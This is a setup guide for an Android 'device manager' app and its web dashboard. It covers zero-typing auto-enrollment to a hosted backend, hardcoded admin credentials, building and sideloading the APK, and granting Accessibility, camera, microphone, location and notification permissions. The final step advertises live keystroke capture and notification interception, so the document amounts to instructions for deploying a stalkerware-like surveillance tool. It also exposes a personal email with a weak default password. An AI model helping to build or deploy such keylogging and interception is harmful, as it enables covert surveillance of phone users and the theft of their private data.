# 🚀 Android Device Manager & Control Center - Setup Guide

This guide details the complete system architecture, the code magic of the **Zero-Typing Automated Pairing Flow**, and step-by-step instructions to compile, install, and run the Android app and control dashboard on your phone and computer.

---

## 🏛 System Architecture & Flows

### 1. Direct Zero-Typing Automated Enrollment Flow
We have implemented a fully automated, seamless, zero-interaction device enrollment flow:
1. **App Installed & Launched**: As soon as the app is opened on your Android device, it welcomes you and checks if it's already set up. If not, it displays the Target Controller's prefilled URL and initiates the auto-connect handshake.
2. **Auto-Prefilled Credentials**: The backend server URL is preconfigured to use your specific hosted development URL (`https://ais-dev-etjoqfdf2ox4fsj5y37jnh-77493896896.europe-west3.run.app`). The admin credentials (`clintonumelo15@gmail.com` with password `admin123`) are securely processed in the background. No typing or copy-pasting is required.
3. **Authentication Handshake**: The app sends an HTTP POST request to `/api/auth/login` on your backend.
4. **Registration Dispatch**: Upon successful login, the app receives an authentication JWT. Using this token in the header as `Authorization: Bearer <token>`, it automatically makes a second POST request to `/api/devices/register-device` sending the device metadata:
   - Device Name (derived from `Build.MODEL`)
   - Manufacturer (`Build.MANUFACTURER`)
   - Model Name (`Build.MODEL`)
   - OS Version (`Build.VERSION.RELEASE`)
   - SDK Version (`Build.VERSION.SDK_INT`)
   - App Version (dynamically resolved)
5. **WebSocket Uplink Setup**: The backend registers the device, assigns a secure, unique `deviceId` and `deviceToken`, and saves them to the device's preferences.
6. **Real-Time Synchronisation & Automatic Transition**: The app displays "Connected!" and automatically initializes the persistent WebSocket connection and the background service before transitioning to the Main Dashboard screen. The WebSocket connection handles bi-directional commands (e.g., location updates, diagnostics) in real-time.

---

## 💻 Step 1: Run the Backend and Admin Control Dashboard

Your backend server serves both the **REST API**, the **WebSocket Hub**, and statically serves the **Web Admin Dashboard**.

### Option A: Running on Localhost (Zero Dependencies)
Ensure you have [Node.js](https://nodejs.org) installed:
```bash
# Navigate to the server folder
cd server

# Install necessary packages
npm install

# Start the Node server
npm start
```
The console will output:
```text
[WS] Web Server running on port 3000
Connected to in-memory integrated database.
```
- **Web Admin URL**: `http://localhost:3000`
- **Default Login User**: `clintonumelo15@gmail.com`
- **Default Login Password**: `admin123`

---

## 📱 Step 2: Build and Install the Android Agent

### 1. Open the Project in Android Studio
1. Launch **Android Studio**.
2. Select **Open** and choose the root directory containing the project.
3. Allow Gradle to sync and index the files automatically.

### 2. Compile the Application APK
- **Via Android Studio**:
  1. Click **Build** in the top menu.
  2. Select **Build Bundle(s) / APK(s)** ➔ **Build APK(s)**.
  3. Once completed, a pop-up in the bottom-right corner will provide a link to the folder containing your brand-new `app-debug.apk`.
  
- **Via Command Line**:
  Run this command in the project root:
  ```bash
  ./gradlew assembleDebug
  ```
  The generated APK will be located at:
  `/app/build/outputs/apk/debug/app-debug.apk`

### 3. Install the App on Your Phone
1. Enable **USB Debugging** on your phone (Go to Settings ➔ About Phone ➔ Tap "Build Number" 7 times, then go to Developer Options ➔ Enable USB Debugging).
2. Connect your phone to your computer via USB.
3. Install via command line:
   ```bash
   adb install app/build/outputs/apk/debug/app-debug.apk
   ```
   Or transfer the `app-debug.apk` directly to your phone via USB/email and install it by tapping on it.

---

## 🎯 Step 3: Run and Watch It Work!

1. Open the **Device Manager** app on your phone.
2. The app will open and immediately run the pairing connection automatically!
3. Within 1-2 seconds, the console at the bottom will display `Connected!` and proceed to the Main Dashboard.
4. Grant the necessary permissions (Location, Notifications, Camera/Mic, Accessibility) from the guide screens to activate all tracking modules.
5. Open your browser to your Web Admin Dashboard and watch your device appear in real-time! You can now send real-time commands and observe live telemetry, location coordinates, captured keystrokes, and intercepted notifications instantly!
